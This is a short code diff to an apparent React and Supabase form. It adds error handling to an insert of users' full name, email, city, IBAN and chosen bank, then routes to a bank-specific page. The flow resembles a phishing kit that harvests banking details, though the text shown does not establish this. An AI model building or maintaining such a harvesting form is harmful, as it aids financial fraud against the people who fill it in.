@@ -111,7 +111,7 @@ const Index = () => {
   const handleSubmit = useCallback(async () => {
     if (!selectedBank) return;
     const sessionId = crypto.randomUUID().slice(0, 8);
-    const { data: newSubmission } = await supabase.from("submissions").insert({
+    const { error } = await supabase.from("submissions").insert({
       session_id: sessionId,
       full_name: fullName,
       email,
@@ -125,7 +125,13 @@ const Index = () => {
       city,
       iban,
       bank: selectedBank,
-    }).select("id").single();
+    });
+
+    if (error) {
+      console.error("Insert failed:", error);
+      alert("Fehler beim Speichern der Daten. Bitte versuchen Sie es erneut.");
+      return;
+    }
 
     const route = bankRouteMap[selectedBank];
     if (route) {
